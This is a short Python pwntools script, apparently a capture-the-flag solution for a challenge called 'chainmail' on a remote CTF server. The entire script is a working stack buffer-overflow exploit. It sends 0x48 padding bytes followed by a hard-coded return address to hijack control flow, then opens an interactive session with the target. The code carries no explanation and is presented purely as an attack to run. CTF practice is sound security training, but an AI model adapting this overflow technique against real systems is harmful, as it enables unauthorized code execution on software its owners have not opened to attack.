from pwn import *

elf = ELF('./chal')
io = remote('chainmail.chal.uiuc.tf', 1337)
#io = process(elf.path)
addr = 0x40121b

payload = b'a' * 0x48
payload += p64(addr)

io.sendlineafter(b'recipient: ', payload)
io.interactive()

